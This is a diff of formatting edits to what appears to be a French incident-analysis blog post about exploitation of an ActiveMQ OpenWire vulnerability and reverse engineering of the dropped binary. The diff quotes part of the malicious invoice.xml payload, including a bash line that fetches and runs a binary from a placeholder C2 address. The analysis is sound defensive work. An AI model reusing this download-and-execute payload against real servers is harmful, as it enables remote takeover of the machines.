@@ -20,7 +20,7 @@ Les investigations nous font remonter jusqu'au programme, que je tente de revers
 
 ![L'attaquant envoie invoice.xml qui va exploiter la vulnérabilité de OpenWire. L'exploit télécharge le binaire docker qui permet à l'attaquant de prendre le contrôle de la machine.](/img/blog/activemq-cve/infection.png)
 
-<figcaption>L'attaquant envoie `invoice.xml` qui va exploiter la vulnérabilité de OpenWire. L'exploit télécharge le binaire `docker` qui permet à l'attaquant de prendre le contrôle de la machine.</figcaption>
+<figcaption>L'attaquant envoie invoice.xml qui va exploiter la vulnérabilité de OpenWire. L'exploit télécharge le binaire docker qui permet à l'attaquant de prendre le contrôle de la machine.</figcaption>
 
 ## Investigation
 
@@ -46,7 +46,7 @@ A première vue, rien ne semble particulièrement louche. Dans l'onglet `Files`,
                 <value>calculator</value -->
                 <value>bash</value>
                 <value>-c</value>
-                <value>curl -s -o /tmp/docker http://<ip C2>/docker; chmod +x /tmp/docker; ./tmp/docker</value>
+                <value>curl -s -o /tmp/docker http://<ip-C2>/docker; chmod +x /tmp/docker; ./tmp/docker</value>
             </list>
             </constructor-arg>
         </bean>
@@ -98,6 +98,6 @@ On peut écarter cette hypothèse car il n'y a pas d'autres chaînes de caractè
 
 Cet "autre chose" pourrait être un identifiant de compromission. Utilisé parfois par les attaquants, un identifiant sert à identifier la victime afin de mieux les monitorer : gardons à l'esprit la volonté d'industrialisation dans ce type d'attaque. Cette hypothèse est plus plausible car ce paramètre est proche de l'appel à `sys_connect`.
 
-![La mystérieuse chaîne de caractère ainsi que l'appel à `sys_connect`.<](img/blog/activemq-cve/reverse.png)
+![La mystérieuse chaîne de caractère ainsi que l'appel à sys_connect.<](img/blog/activemq-cve/reverse.png)
 
-<figcaption>La mystérieuse chaîne de caractère ainsi que l'appel à `sys_connect`.</figcaption>
+<figcaption>La mystérieuse chaîne de caractère ainsi que l'appel à sys_connect.</figcaption>
